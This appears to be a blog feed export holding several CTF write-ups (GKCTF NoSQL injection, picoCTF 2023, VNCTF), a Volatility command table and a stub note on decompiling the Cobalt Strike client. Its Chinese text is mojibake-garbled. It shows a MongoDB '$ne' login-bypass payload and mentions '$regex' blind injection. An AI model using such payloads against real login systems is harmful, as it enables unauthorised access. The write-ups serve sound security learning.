href="https://pan.baidu.com/s/1js3lac6myNUN1LZ0Fvplig">https://pan.baidu.com/s/1js3lac6myNUN1LZ0Fvplig</a> æå–ç ï¼šGAME md5å€¼ï¼š051dbbe806e36d921a579f3a1db16aba æŒ‘æˆ˜åŒºäºŒ.zipï¼š<a href="https://pan.baidu.com/s/119wfiZlc3yw11qMKZWuylQ">https://pan.baidu.com/s/119wfiZlc3yw11qMKZWuylQ</a> æå–ç ï¼šGAME md5å€¼ï¼šc1fff7d2bb8fea7698157267dc16ca0d ï¼ˆè§£å‹å¯†ç å°†åœ¨æ¯”èµ›æ—¶å¯¹åº”é¢˜ç›®æè¿°é‡Œï¼‰</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>GKCTF-2021-hackme</title>
      <link href="/2023/03/29/GKCTF-2021-hackme/"/>
      <url>/2023/03/29/GKCTF-2021-hackme/</url>
      
        <content type="html"><![CDATA[<p>å¤ç°åœ°å€ï¼š<a href="https://buuoj.cn/challenges#[GKCTF%202021]hackme">https://buuoj.cn/challenges#[GKCTF%202021]hackme</a></p><p>ç›´æ¥è®¿é—®é¶æœºæ˜¯ä¸€ä¸ªç™»å½•ç•Œé¢</p><p><img src="C:\Users\xin\AppData\Roaming\Typora\typora-user-images\image-20230329165150877.png" alt="image-20230329165150877"></p><p>ç»™äº†æç¤ºï¼šunicode   ,   æ³¨æ„serverå’Œå…¶é…ç½®æ–‡ä»¶</p><p>å³é”®æŸ¥çœ‹æºä»£ç ï¼Œå¯ä»¥çœ‹åˆ°ä¸€ä¸ªæ³¨é‡Šï¼Œ<!--doyounosql?-->ï¼Œè¿™é‡Œæ˜¯ä¸‰ä¸ªå•è¯è€Œä¸æ˜¯å››ä¸ªï¼Œdo you nosqlï¼Ÿ</p><h5 id="ä»€ä¹ˆæ˜¯-Nosql"><a href="#ä»€ä¹ˆæ˜¯-Nosql" class="headerlink" title="ä»€ä¹ˆæ˜¯ Nosql"></a>ä»€ä¹ˆæ˜¯ Nosql</h5><p>NoSQL å³ Not Only SQLï¼Œæ„å³ â€œä¸ä»…ä»…æ˜¯SQLâ€ã€‚åœ¨ç°ä»£çš„è®¡ç®—ç³»ç»Ÿä¸Šæ¯å¤©ç½‘ç»œä¸Šéƒ½ä¼šäº§ç”Ÿåºå¤§çš„æ•°æ®é‡ã€‚è¿™äº›æ•°æ®æœ‰å¾ˆå¤§ä¸€éƒ¨åˆ†æ˜¯ç”±å…³ç³»æ•°æ®åº“ç®¡ç†ç³»ç»Ÿï¼ˆRDBMSï¼‰æ¥å¤„ç†ã€‚ é€šè¿‡åº”ç”¨å®è·µè¯æ˜ï¼Œå…³ç³»æ¨¡å‹æ˜¯éå¸¸é€‚åˆäºå®¢æˆ·æœåŠ¡å™¨ç¼–ç¨‹ï¼Œè¿œè¿œè¶…å‡ºé¢„æœŸçš„åˆ©ç›Šï¼Œä»Šå¤©å®ƒæ˜¯ç»“æ„åŒ–æ•°æ®å­˜å‚¨åœ¨ç½‘ç»œå’Œå•†åŠ¡åº”ç”¨çš„ä¸»å¯¼æŠ€æœ¯ã€‚</p><p>NoSQL æ˜¯ä¸€é¡¹å…¨æ–°çš„æ•°æ®åº“é©å‘½æ€§è¿åŠ¨ï¼Œæ—©æœŸå°±æœ‰äººæå‡ºï¼Œå‘å±•è‡³ 2009 å¹´è¶‹åŠ¿è¶Šå‘é«˜æ¶¨ã€‚NoSQLçš„æ‹¥æŠ¤è€…ä»¬æå€¡è¿ç”¨éå…³ç³»å‹çš„æ•°æ®å­˜å‚¨ï¼Œç›¸å¯¹äºé“ºå¤©ç›–åœ°çš„å…³ç³»å‹æ•°æ®åº“è¿ç”¨ï¼Œè¿™ä¸€æ¦‚å¿µæ— ç–‘æ˜¯ä¸€ç§å…¨æ–°çš„æ€ç»´çš„æ³¨å…¥ã€‚</p><h5 id="ä»€ä¹ˆæ˜¯-MongoDB"><a href="#ä»€ä¹ˆæ˜¯-MongoDB" class="headerlink" title="ä»€ä¹ˆæ˜¯ MongoDB"></a>ä»€ä¹ˆæ˜¯ MongoDB</h5><p>MongoDB æ˜¯å½“å‰æœ€æµè¡Œçš„ NoSQL æ•°æ®åº“äº§å“ä¹‹ä¸€ï¼Œç”± C++ è¯­è¨€ç¼–å†™ï¼Œæ˜¯ä¸€ä¸ªåŸºäºåˆ†å¸ƒå¼æ–‡ä»¶å­˜å‚¨çš„æ•°æ®åº“ã€‚æ—¨åœ¨ä¸º WEB åº”ç”¨æä¾›å¯æ‰©å±•çš„é«˜æ€§èƒ½æ•°æ®å­˜å‚¨è§£å†³æ–¹æ¡ˆã€‚MongoDB æ˜¯ä¸€ä¸ªä»‹äºå…³ç³»æ•°æ®åº“å’Œéå…³ç³»æ•°æ®åº“ä¹‹é—´çš„äº§å“ï¼Œæ˜¯éå…³ç³»æ•°æ®åº“å½“ä¸­åŠŸèƒ½æœ€ä¸°å¯Œï¼Œæœ€åƒå…³ç³»æ•°æ®åº“çš„ã€‚</p><p>MongoDB å°†æ•°æ®å­˜å‚¨ä¸ºä¸€ä¸ªæ–‡æ¡£ï¼Œæ•°æ®ç»“æ„ç”±é”®å€¼ï¼ˆkey=&gt;valueï¼‰å¯¹ç»„æˆã€‚MongoDB æ–‡æ¡£ç±»ä¼¼äº JSON å¯¹è±¡ã€‚å­—æ®µå€¼å¯ä»¥åŒ…å«å…¶ä»–æ–‡æ¡£ï¼Œæ•°ç»„åŠæ–‡æ¡£æ•°ç»„ã€‚</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;_id&quot; : ObjectId(&quot;60fa854cf8aaaf4f21049148&quot;),</span><br><span class="line">    &quot;name&quot; : &quot;bohemian&quot;,</span><br><span class="line">    &quot;description&quot; : &quot;the admin user&quot;,</span><br><span class="line">    &quot;age&quot; : <span class="number">19</span>,</span><br><span class="line">    &quot;status&quot; : &quot;A&quot;,</span><br><span class="line">    &quot;groups&quot; : [</span><br><span class="line">        &quot;admins&quot;,</span><br><span class="line">        &quot;users&quot;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="Nosql-æ³¨å…¥çš„ç®€ä»‹"><a href="#Nosql-æ³¨å…¥çš„ç®€ä»‹" class="headerlink" title="Nosql æ³¨å…¥çš„ç®€ä»‹"></a>Nosql æ³¨å…¥çš„ç®€ä»‹</h5><p>NoSQL æ³¨å…¥ç”±äº NoSQL æœ¬èº«çš„ç‰¹æ€§å’Œä¼ ç»Ÿçš„ SQL æ³¨å…¥æœ‰æ‰€åŒºåˆ«ã€‚ä½¿ç”¨ä¼ ç»Ÿçš„SQLæ³¨å…¥ï¼Œæ”»å‡»è€…åˆ©ç”¨ä¸å®‰å…¨çš„ç”¨æˆ·è¾“å…¥æ¥ä¿®æ”¹æˆ–æ›¿æ¢åº”ç”¨ç¨‹åºå‘é€åˆ°æ•°æ®åº“å¼•æ“çš„ SQL æŸ¥è¯¢è¯­å¥ï¼ˆæˆ–å…¶ä»–SQLè¯­å¥ï¼‰ã€‚<br>æ¢å¥è¯è¯´ï¼ŒSQL æ³¨å…¥ä½¿æ”»å‡»è€…å¯ä»¥åœ¨æ•°æ®åº“ä¸­ SQL æ‰§è¡Œå‘½ä»¤ã€‚</p><p>ä¸å…³ç³»æ•°æ®åº“ä¸åŒï¼ŒNoSQL æ•°æ®åº“ä¸ä½¿ç”¨é€šç”¨æŸ¥è¯¢è¯­è¨€ã€‚NoSQL æŸ¥è¯¢è¯­æ³•æ˜¯ç‰¹å®šäºäº§å“çš„ï¼ŒæŸ¥è¯¢æ˜¯ä½¿ç”¨åº”ç”¨ç¨‹åºçš„ç¼–ç¨‹è¯­è¨€ç¼–å†™çš„ï¼šPHPï¼ŒJavaScriptï¼ŒPythonï¼ŒJava ç­‰ã€‚è¿™æ„å‘³ç€æˆåŠŸçš„æ³¨å…¥ä½¿æ”»å‡»è€…ä¸ä»…å¯ä»¥åœ¨æ•°æ®åº“ä¸­æ‰§è¡Œå‘½ä»¤ï¼Œè€Œä¸”å¯ä»¥åœ¨åº”ç”¨ç¨‹åºæœ¬èº«ä¸­æ‰§è¡Œå‘½ä»¤ï¼Œè¿™å¯èƒ½æ›´åŠ å±é™©ã€‚</p><ul><li><strong>é‡è¨€å¼æ³¨å…¥</strong></li></ul><p>åˆç§°ä¸ºæ°¸çœŸå¼ï¼Œæ­¤ç±»æ”»å‡»æ˜¯åœ¨æ¡ä»¶è¯­å¥ä¸­æ³¨å…¥ä»£ç ï¼Œä½¿ç”Ÿæˆçš„è¡¨è¾¾å¼åˆ¤å®šç»“æœæ°¸è¿œä¸ºçœŸï¼Œä»è€Œç»•è¿‡è®¤è¯æˆ–è®¿é—®æœºåˆ¶ã€‚</p><p>é»˜è®¤ç”¨æˆ·è¾“å…¥è´¦å·å¯†ç åçš„username password ä¸ºè¿™æ ·çš„</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=bohemian&amp;password=<span class="number">657260</span></span><br></pre></td></tr></table></figure><p>è¿›å…¥ PHP åçš„ç¨‹åºæ•°æ®å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;username&#x27;</span> =&gt; <span class="string">&#x27;bohemian&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;password&#x27;</span> =&gt; <span class="string">&#x27;657260&#x27;</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>ä¸ºä¸€ä¸ªæ•°ç»„ï¼Œå°†æ­¤å¸¦åˆ°å…¥åˆ°mongodbä¸­ä¸º</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">&gt;</span> db.users.find(&#123;<span class="string">&#x27;username&#x27;</span>:<span class="string">&#x27;bohemian&#x27;</span>, <span class="string">&#x27;password&#x27;</span>:<span class="string">&#x27;657260&#x27;</span>&#125;)</span><br></pre></td></tr></table></figure><p>åœ¨mongodbä¸­æœ‰ä¸€äº›æ¡ä»¶æ“ä½œç¬¦ï¼Œ</p><ul><li><p><code>$eq</code>: (equal)ç­‰äº</p></li><li><p><code>$gt</code>ï¼š(greater than)å¤§çº¦</p></li><li><p><code>$gte</code>: (greater than equal)å¤§çº¦ç­‰äº</p></li><li><p><code>$in</code>ï¼šç­‰äºæ•°ç»„ä¸­çš„æŸä¸€é¡¹ï¼Œ{field:{$in:{value1,value2â€¦}}}</p></li><li><p><code>$lt</code>ï¼š(less than)å°äº</p></li><li><p><code>$lte</code>ï¼š(less than equal)å°äºç­‰äº</p></li><li><p><code>$ne</code>ï¼š(not equal)ä¸ç­‰äº</p></li><li><p><code>$nin</code>ï¼š(not in)ä¸ç­‰äºæ•°ç»„ä¸­çš„ä»»ä½•ä¸€é¡¹</p><p>å¦‚</p></li></ul><p>//æŸ¥è¯¢age = 22çš„è®°å½•</p><p>db.userInfo.find({â€œageâ€: 22});</p><p>//ç›¸å½“äºï¼šselect * from userInfo where age = 22;</p><p>//æŸ¥è¯¢age &gt; 22çš„è®°å½•</p><p>db.userInfo.find({age: {$gt: 22}});</p><p>//ç›¸å½“äºï¼šselect * from userInfo where age &gt; 22;</p><p>å¦‚æœå½“æˆ‘ä»¬è¾“å…¥username[$ne]=1æ—¶ï¼Œå°±ä¼šæˆä¸º</p><p>username=array($ne=&gt;1)  == â€˜usernameâ€™:{$ne:1}</p><p>å¸¦å…¥åˆ°mongodbä¸­db.users.find({â€˜usernameâ€™:{$ne:1}, â€˜passwordâ€™:{$ne:1}})</p><p>å½“é¡µé¢æ²¡æœ‰å›æ˜¾æ—¶ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥é€šè¿‡ <code>$regex</code> æ­£åˆ™è¡¨è¾¾å¼æ¥è¿›è¡Œç›²æ³¨ï¼Œ <code>$regex</code> å¯ä»¥è¾¾åˆ°å’Œä¼ ç»Ÿ SQL æ³¨å…¥ä¸­ <code>substr()</code> å‡½æ•°ç›¸åŒçš„åŠŸèƒ½ã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> nosql </tag>
            
            <tag> buuctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>picoCTF-2023-éƒ¨åˆ†wp</title>
      <link href="/2023/03/27/CTFS/picoCTF-2023-%E9%83%A8%E5%88%86wp/"/>
      <url>/2023/03/27/CTFS/picoCTF-2023-%E9%83%A8%E5%88%86wp/</url>
      
        <content type="html"><![CDATA[<p><img src="/images/2023picoctf/image-20230327161915650.png" alt="image-20230327161915650"></p><h3 id="web"><a href="#web" class="headerlink" title="web"></a>web</h3><h4 id="findme"><a href="#findme" class="headerlink" title="findme"></a>findme</h4><p>è®¿é—®é¡µé¢ï¼Œæ˜¯ä¸€ä¸ªç™»å½•çš„é¡µé¢ï¼Œè´¦å·å¯†ç <code>test/test!</code></p><p>æŠ“åŒ…çœ‹åˆ°è·³è½¬åˆ°ä¸€ä¸ªé¡µé¢ï¼Œ</p><p>(/images/2023picoctf/image-20230327162639364.png)</p><p><img src="/images/2023picoctf/image-20230327162802078.png" alt="image-20230327162802078"></p><p>è®¿é—®è¿™ä¸ª/next-page/id=cGljb0NURntwcm94aWVzX2Fs</p><p><img src="/images/2023picoctf/image-20230327162857583.png" alt="image-20230327162857583"></p><p>æŠ“åŒ…ï¼Œä¸­é—´åˆä¼šè·³è½¬ä¸€ä¸ªé¡µé¢ï¼Œç›´æ¥è·³å‡ºæ¥ä¸€ä¸ªé¡µé¢ï¼Œçœ‹åˆ°æœ‰ä¸€ä¸ªidï¼Œå¥½åƒæ˜¯base64ï¼Œç›´æ¥æ‹¼æ¥</p><p><img src="/images/2023picoctf/image-20230327164821310.png" alt="image-20230327164821310"></p><p>flag:picoCTF{proxies_all_the_way_a0fe074f}</p><h4 id="chrono"><a href="#chrono" class="headerlink" title="chrono"></a>chrono</h4><p>How to automate tasks to run at intervals on linux servers?</p><p>æœºç¿»ï¼šå¦‚ä½•è‡ªåŠ¨æ‰§è¡Œä»»åŠ¡ä»¥åœ¨ Linux æœåŠ¡å™¨ä¸Šå®šæœŸè¿è¡Œï¼Ÿ</p><p>ç»™äº†è´¦å·å¯†ç ç«¯å£ï¼Œç›´æ¥è¿ä¸Šå»</p><p>å®šæ—¶ä»»åŠ¡çš„å‘½ä»¤  crontab  ï¼Œæ‰§è¡Œcrontab -l å‘ç°æ²¡æœ‰ï¼Œcrontabçš„æ–‡ä»¶ç›®å½•åœ¨/etc/ä¸‹  ä»¥cronå¼€å¤´ï¼Œ</p><p><img src="/images/2023picoctf/image-20230327165914627.png" alt="image-20230327165914627"></p><p>åœ¨ challengeç›®å½•ä¸‹ä¹Ÿæœ‰flag</p><p><img src="/images/2023picoctf/image-20230327170454662.png" alt="image-20230327170454662"></p><p>flag:{â€œflagâ€: â€œpicoCTF{Sch3DUL7NG_T45K3_L1NUX_1d781160}â€, â€œusernameâ€: â€œpicoplayerâ€, â€œpasswordâ€: â€œdd4yT2bR</p><h4 id="hideme"><a href="#hideme" class="headerlink" title="hideme"></a>hideme</h4><p>Every file gets a flag.<br>The SOC analyst saw one image been sent back and forth between two people. They decided to investigate and found out that there was more than what</p><p>æœºç¿»ä¸€ä¸‹ï¼šæ¯ä¸ªæ–‡ä»¶éƒ½æœ‰ä¸€ä¸ªæ ‡å¿—ã€‚<br>SOC åˆ†æå¸ˆçœ‹åˆ°ä¸€å¼ å›¾åƒåœ¨ä¸¤ä¸ªäººä¹‹é—´æ¥å›å‘é€ã€‚ ä»–ä»¬å†³å®šå±•å¼€è°ƒæŸ¥ï¼Œå‘ç°äº‹æƒ…è¿œä¸æ­¢äºæ­¤</p><p>ç›´æ¥ä¸‹è½½ä¸€å¼ å›¾ç‰‡</p><p>foremost æœ‰ä¸€ä¸ªzipåŒ…</p><p><img src="/images/2023picoctf/image-20230327173305594.png" alt="image-20230327173305594"></p><p><img src="/images/2023picoctf/image-20230327173324858.png" alt="image-20230327173324858"></p><p>ristretto flag.png</p><p><img src="/images/2023picoctf/image-20230327173335655.png" alt="image-20230327173335655"></p><p>flag:pIcoCTF{Hiddinng_An_imag3_within_@n_ima9e_96539bea}</p><h4 id="MatchTheRegex"><a href="#MatchTheRegex" class="headerlink" title="MatchTheRegex"></a>MatchTheRegex</h4><p>æ­£åˆ™åŒ¹é…</p><p>è¾“å…¥æ¡†è¾“å…¥ä¸œè¥¿ï¼Œ</p><p><img src="/images/2023picoctf/image-20230327204642026.png" alt="image-20230327204642026"></p><p>på¼€å¤´ Fç»“å°¾</p><table><thead><tr><th><a href="https://www.runoob.com/jsref/jsref-regexp-ncaret.html">^n</a></th><th>åŒ¹é…ä»»ä½•å¼€å¤´ä¸º n çš„å­—ç¬¦ä¸²ã€‚</th></tr></thead><tbody><tr><td></td><td></td></tr></tbody></table><p><img src="/images/2023picoctf/image-20230327204620651.png" alt="image-20230327204620651"></p><p>flag:picoCTF{succ3ssfully_matchtheregex_0694f25b}</p><h4 id="SOAP"><a href="#SOAP" class="headerlink" title="SOAP"></a>SOAP</h4><h4 id="money-ware"><a href="#money-ware" class="headerlink" title="money-ware"></a>money-ware</h4><p>Flag format: picoCTF{Malwarename}The first letter of the malware name should be capitalized and the rest lowercase.Your friend just got hacked and has been asked to pay some bitcoins to <code>1Mz7153HMuxXTuR2R1t78mGSdzaAtNbBWX</code>. He doesnâ€™t seem to understand what is going on and asks you for advice. Can you identify what malware heâ€™s being a victim of?</p><p>æ ‡è®°æ ¼å¼ï¼špicoCTF{Malwarename}<br>æ¶æ„è½¯ä»¶åç§°çš„é¦–å­—æ¯åº”å¤§å†™ï¼Œå…¶ä½™å­—æ¯å°å†™ã€‚<br>æ‚¨çš„æœ‹å‹åˆšåˆšè¢«é»‘å®¢å…¥ä¾µï¼Œå¹¶è¢«è¦æ±‚å‘ 1Mz7153HMuxXTuR2R1t78mGSdzaAtNbBWX æ”¯ä»˜ä¸€äº›æ¯”ç‰¹å¸ã€‚ ä»–ä¼¼ä¹ä¸æ˜ç™½å‘ç”Ÿäº†ä»€ä¹ˆï¼Œå¹¶å‘ä½ å¾æ±‚æ„è§ã€‚ ä½ èƒ½ç¡®å®šä»–æ˜¯å“ªç§æ¶æ„è½¯ä»¶çš„å—å®³è€…å—ï¼Ÿ</p><p><img src="/images/2023picoctf/image-20230327222153657.png" alt="image-20230327222153657"></p><p>flag:picoCTF{Petya}</p><h4 id="repetitions"><a href="#repetitions" class="headerlink" title="repetitions"></a>repetitions</h4><p>ä¸‹è½½æ–‡ä»¶ï¼Œæ‹–åˆ°ida</p><p><img src="/images/2023picoctf/image-20230327224136231.png" alt="image-20230327224136231"></p><p>base64 å¤šè§£å‡ æ¬¡</p><p><img src="/images/2023picoctf/image-20230327224302506.png" alt="image-20230327224302506"></p><p>flag:picoCTF{base64_n3st3d_dic0d!n8_d0wnl04d3d_9b59b35c}</p><h4 id="rule"><a href="#rule" class="headerlink" title="rule"></a>rule</h4><p><img src="/images/2023picoctf/image-20230327224727627.png" alt="image-20230327224727627"></p><p>flag:picoCTF{h34rd_und3r5700d_4ck_cba1c711}</p><h4 id="FindAndOpen"><a href="#FindAndOpen" class="headerlink" title="FindAndOpen"></a>FindAndOpen</h4><p>ä¸‹è½½pacpåŒ…ï¼Œä¸­é—´æœ‰ä¸ªbaseè§£ä¸€ä¸‹</p><p>è¿™ä¸ªæ˜¯ä¸‹é¢å‹ç¼©åŒ…çš„å¯†ç </p><p>å†è§£ä¸€ä¸‹ï¼Œå°±å¯ä»¥äº†</p><p><img src="/images/2023picoctf/image-20230328162924061.png" alt="image-20230328162924061"></p><p>picoCTF{R34DING_LOKd_fil56_succ3ss_419835ef}</p><h3 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h3><h3 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h3><p>ç›´æ¥æ‹–åˆ°idaé‡Œ</p><h3 id="safe-opener2"><a href="#safe-opener2" class="headerlink" title="safe opener2"></a>safe opener2</h3><p>ç›´æ¥æ‹–åˆ°ida</p><h3 id="timer"><a href="#timer" class="headerlink" title="timer"></a>timer</h3><p>æ‹–åˆ°Androidkillé‡Œ</p><p>æ‰¾åˆ°buildconfigæ–‡ä»¶å³å¯</p><p><img src="/images/2023picoctf/image-20230328205729022.png" alt="image-20230328205729022"></p><p>flag:picoCTF{t1m3r_r3v3rs3d_succ355fully_17496}</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>cs4.9.1äºŒå¼€</title>
      <link href="/2023/03/03/cs4-9-1%E4%BA%8C%E5%BC%80/cs4-9-1%E4%BA%8C%E5%BC%80/"/>
      <url>/2023/03/03/cs4-9-1%E4%BA%8C%E5%BC%80/cs4-9-1%E4%BA%8C%E5%BC%80/</url>
      
        <content type="html"><![CDATA[<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&quot;C:\Program Files\Java\jdk-17\bin\java.exe&quot; -cp java-decompiler.jar org.jetbrains.java.decompiler.main.decompiler.ConsoleDecompiler -dgs=true cobaltstrike-client.jar cs_src</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-XX:+AggressiveHeap -XX:+UseParallelGC</span><br></pre></td></tr></table></figure><p>a</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>VNCTF2023</title>
      <link href="/2023/02/18/VNCTF2023/"/>
      <url>/2023/02/18/VNCTF2023/</url>
      
        <content type="html"><![CDATA[<h3 id="web"><a href="#web" class="headerlink" title="web"></a>web</h3><h4 id="è±¡æ£‹ç‹å­"><a href="#è±¡æ£‹ç‹å­" class="headerlink" title="è±¡æ£‹ç‹å­"></a>è±¡æ£‹ç‹å­</h4><p>é¡¾åæ€ä¹‰ï¼Œåº”è¯¥æ˜¯ä¸‹è±¡æ£‹çš„ï¼Œæˆ‘ä»¬å¯ä»¥ä¸‹ï¼Œå¤ªèœäº†ï¼Œjsç›´æ¥ç¿»<br><a href="http://236f7cc1-466c-4d47-abf8-21b4ffc92cf7.node4.buuoj.cn:81/js/play.js">http://236f7cc1-466c-4d47-abf8-21b4ffc92cf7.node4.buuoj.cn:81/js/play.js</a><br>åœ¨play.jsä¸­  ä¸‹é¢æœ‰jsfuck</p><p><img src="/images/others/image-20230218114910836.png" alt="image-20230218114910836"></p><p><img src="/images/others/image-20230218114953833.png" alt="image-20230218114953833"></p><p>ç›´æ¥å¤åˆ¶æ‰€æœ‰ï¼Œåˆ°æµè§ˆå™¨consoleä¸­ï¼Œå³å¯</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>volatilityå¸¸ç”¨å‘½ä»¤</title>
      <link href="/2023/02/17/volatility%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
      <url>/2023/02/17/volatility%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<p>å‚è€ƒ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://wiki.wgpsec.org/knowledge/ctf/Volatility.html#%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4</span><br><span class="line">https://blog.csdn.net/u011250160/article/details/120473177</span><br></pre></td></tr></table></figure><h3 id="volatility2"><a href="#volatility2" class="headerlink" title="volatility2"></a>volatility2</h3><h4 id="å¸¸ç”¨æ¨¡å—"><a href="#å¸¸ç”¨æ¨¡å—" class="headerlink" title="å¸¸ç”¨æ¨¡å— #"></a>å¸¸ç”¨æ¨¡å— <a href="https://wiki.wgpsec.org/knowledge/ctf/Volatility.html#%E5%B8%B8%E7%94%A8%E6%A8%A1%E5%9D%97">#</a></h4><table><thead><tr><th><strong>æ’ä»¶åç§°</strong></th><th><strong>åŠŸèƒ½</strong></th></tr></thead><tbody><tr><td>amcache</td><td>æŸ¥çœ‹AmCacheåº”ç”¨ç¨‹åºç—•è¿¹ä¿¡æ¯</td></tr><tr><td>apihooks</td><td>æ£€æµ‹å†…æ ¸åŠè¿›ç¨‹çš„å†…å­˜ç©ºé—´ä¸­çš„API hook</td></tr><tr><td>atoms</td><td>åˆ—å‡ºä¼šè¯åŠçª—å£ç«™atomè¡¨</td></tr><tr><td>atomscan</td><td>Atomè¡¨çš„æ± æ‰«æ(Pool scanner)</td></tr><tr><td>auditpol</td><td>åˆ—å‡ºæ³¨å†Œè¡¨HKLMSECURITYPolicyPolAdtEvçš„å®¡è®¡ç­–ç•¥ä¿¡æ¯</td></tr><tr><td>bigpools</td><td>ä½¿ç”¨BigPagePoolScannerè½¬å‚¨å¤§åˆ†é¡µæ± (big page pools)</td></tr><tr><td>bioskbd</td><td>ä»å®æ—¶æ¨¡å¼å†…å­˜ä¸­è¯»å–é”®ç›˜ç¼“å†²æ•°æ®(æ—©æœŸç”µè„‘å¯ä»¥è¯»å–å‡ºBIOSå¼€æœºå¯†ç )</td></tr><tr><td>cachedump</td><td>è·å–å†…å­˜ä¸­ç¼“å­˜çš„åŸŸå¸å·çš„å¯†ç å“ˆå¸Œ</td></tr><tr><td>callbacks</td><td>æ‰“å°å…¨ç³»ç»Ÿé€šçŸ¥ä¾‹ç¨‹</td></tr><tr><td>clipboard</td><td>æå–Windowså‰ªè´´æ¿ä¸­çš„å†…å®¹</td></tr><tr><td>cmdline</td><td>æ˜¾ç¤ºè¿›ç¨‹å‘½ä»¤è¡Œå‚æ•°</td></tr><tr><td>cmdscan</td><td>æå–æ‰§è¡Œçš„å‘½ä»¤è¡Œå†å²è®°å½•ï¼ˆæ‰«æ_COMMAND_HISTORYä¿¡æ¯ï¼‰</td></tr><tr><td>connections</td><td>æ‰“å°ç³»ç»Ÿæ‰“å¼€çš„ç½‘ç»œè¿æ¥(ä»…æ”¯æŒWindows XP å’Œ2003)</td></tr><tr><td>connscan</td><td>æ‰“å°TCPè¿æ¥ä¿¡æ¯</td></tr><tr><td>consoles</td><td>æå–æ‰§è¡Œçš„å‘½ä»¤è¡Œå†å²è®°å½•ï¼ˆæ‰«æ_CONSOLE_INFORMATIONä¿¡æ¯ï¼‰</td></tr><tr><td>crashinfo</td><td>æå–å´©æºƒè½¬å‚¨ä¿¡æ¯</td></tr><tr><td>deskscan</td><td>tagDESKTOPæ± æ‰«æ(Poolscaner)</td></tr><tr><td>devicetree</td><td>æ˜¾ç¤ºè®¾å¤‡æ ‘ä¿¡æ¯</td></tr><tr><td>dlldump</td><td>ä»è¿›ç¨‹åœ°å€ç©ºé—´è½¬å‚¨åŠ¨æ€é“¾æ¥åº“</td></tr><tr><td>dlllist</td><td>æ‰“å°æ¯ä¸ªè¿›ç¨‹åŠ è½½çš„åŠ¨æ€é“¾æ¥åº“åˆ—è¡¨</td></tr><tr><td>driverirp</td><td>IRP hooké©±åŠ¨æ£€æµ‹</td></tr><tr><td>drivermodule</td><td>å…³è”é©±åŠ¨å¯¹è±¡è‡³å†…æ ¸æ¨¡å—</td></tr><tr><td>driverscan</td><td>é©±åŠ¨å¯¹è±¡æ± æ‰«æ</td></tr><tr><td>dumpcerts</td><td>æå–RASç§é’¥åŠSSLå…¬é’¥</td></tr><tr><td>dumpfiles</td><td>æå–å†…å­˜ä¸­æ˜ å°„æˆ–ç¼“å­˜çš„æ–‡ä»¶</td></tr><tr><td>dumpregistry</td><td>è½¬å‚¨å†…å­˜ä¸­æ³¨å†Œè¡¨ä¿¡æ¯è‡³ç£ç›˜</td></tr><tr><td>editbox</td><td>æŸ¥çœ‹Editç¼–è¾‘æ§ä»¶ä¿¡æ¯ (Listboxæ­£åœ¨å®éªŒä¸­)</td></tr><tr><td>envars</td><td>æ˜¾ç¤ºè¿›ç¨‹çš„ç¯å¢ƒå˜é‡</td></tr><tr><td>eventhooks</td><td>æ‰“å°Windowsäº‹ä»¶hookè¯¦ç»†ä¿¡æ¯</td></tr><tr><td>evtlogs</td><td>æå–Windowsäº‹ä»¶æ—¥å¿—ï¼ˆä»…æ”¯æŒXP/2003)</td></tr><tr><td>filescan</td><td>æå–æ–‡ä»¶å¯¹è±¡ï¼ˆfile objectsï¼‰æ± ä¿¡æ¯</td></tr><tr><td>gahti</td><td>è½¬å‚¨ç”¨æˆ·å¥æŸ„ï¼ˆhandleï¼‰ç±»å‹ä¿¡æ¯</td></tr><tr><td>gditimers</td><td>æ‰“å°å·²å®‰è£…çš„GDIè®¡æ—¶å™¨(timers)åŠå›è°ƒ(callbacks)</td></tr><tr><td>gdt</td><td>æ˜¾ç¤ºå…¨å±€æè¿°ç¬¦è¡¨(Global Deor 